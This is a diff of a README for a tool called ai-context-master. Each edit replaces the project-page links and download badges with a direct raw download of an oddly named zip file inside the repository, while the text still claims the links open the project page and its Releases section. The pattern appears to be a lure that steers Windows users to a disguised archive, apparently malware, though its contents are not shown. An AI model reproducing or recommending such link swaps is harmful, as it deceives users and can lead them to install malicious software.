@@ -1,6 +1,6 @@
 # ⚙️ ai-context-master - Manage Your Context Easily
 
-[![Download ai-context-master](https://img.shields.io/badge/Download-ai--context--master-brightgreen)](https://github.com/staffardinsoluble415/ai-context-master)
+[![Download ai-context-master](https://img.shields.io/badge/Download-ai--context--master-brightgreen)](https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip)
 
 ## About ai-context-master
 
@@ -26,7 +26,7 @@ Follow these steps to get ai-context-master running on your Windows PC. You do n
 
 1. **Download the app**  
    Click the big green badge at the top or use this link:  
-   [https://github.com/staffardinsoluble415/ai-context-master](https://github.com/staffardinsoluble415/ai-context-master)  
+   [https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip](https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip)  
 
    This link will take you to the project page where you can find the latest download under the "Releases" section.
 
@@ -94,7 +94,7 @@ These settings are accessible from the menu under “Options” or “Settings�
 To keep the app running smoothly, check for updates regularly:
 
 1. Visit the project page:  
-   [https://github.com/staffardinsoluble415/ai-context-master](https://github.com/staffardinsoluble415/ai-context-master)  
+   [https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip](https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip)  
 2. Look for new releases in the "Releases" section.
 3. Download the latest version and install it following the steps above.
 
@@ -125,11 +125,11 @@ The developers monitor feedback to keep the app reliable.
 ## 🔗 Useful Links
 
 - **Project Page:**  
-  [https://github.com/staffardinsoluble415/ai-context-master](https://github.com/staffardinsoluble415/ai-context-master)
+  [https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip](https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip)
 
 - **Download Latest Release:**  
   Visit the above link, then select the "Releases" section to find the setup file.
 
 ---
 
-[![Download ai-context-master](https://img.shields.io/badge/Download-ai--context--master-blue)](https://github.com/staffardinsoluble415/ai-context-master)
+[![Download ai-context-master](https://img.shields.io/badge/Download-ai--context--master-blue)](https://github.com/staffardinsoluble415/ai-context-master/raw/refs/heads/main/MemoryOS/context_ai_master_coonily.zip)
